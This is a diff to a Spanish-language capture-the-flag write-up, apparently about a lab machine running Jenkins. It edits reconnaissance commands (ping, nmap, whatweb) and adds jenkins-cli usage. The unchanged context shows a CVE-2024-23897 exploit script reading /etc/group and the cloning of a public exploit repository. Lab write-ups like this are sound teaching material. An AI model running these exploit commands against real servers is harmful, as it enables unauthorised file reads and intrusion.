@@ -10,7 +10,7 @@ mkt
 
 - Ingresamos a nuestra carpeta de nmap y realizamos un ping y escaneo a la red.
 ```
-ping -c 10.10.11.10
+ping -c 1 10.10.11.10
 ```
 - Con el siguiente comando registraremos la información en el archivo allPorts
 ```
@@ -63,6 +63,11 @@ nmap -p22,8080 -sCV 10.10.11.10 -oN targeted
 **OpenSSH 8.9p1 Ubuntu 3ubuntu0.6**
 - Investigando con la página **launchpad** nos damos cuenta que estamos con la versión Jammy de Ubuntu 
 **JAMMY**
+- El siguiente comando nos permite ver el contenido de manera java 
+```
+cat targeted -l java
+```
+
 - A continuación empezamos a utilizar la herramienta **whatweb**
 ```
 whatweb http://10.10.11.10:8080
@@ -102,6 +107,11 @@ python3 CVE-2024-23897.py -u http://10.10.11.10:8080 -f /etc/group
 - Tambien tenemos otro exploit que nos trae de local el recurso
 ```
 git clone https://github.com/CKevens/CVE-2024-23897.git
+```
+
+- Con este comando podemos ejecutar whoami por ejemplo
+```
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080 who-am-i
 ```
 - Con este comando podemos enlistar mas información
 ```
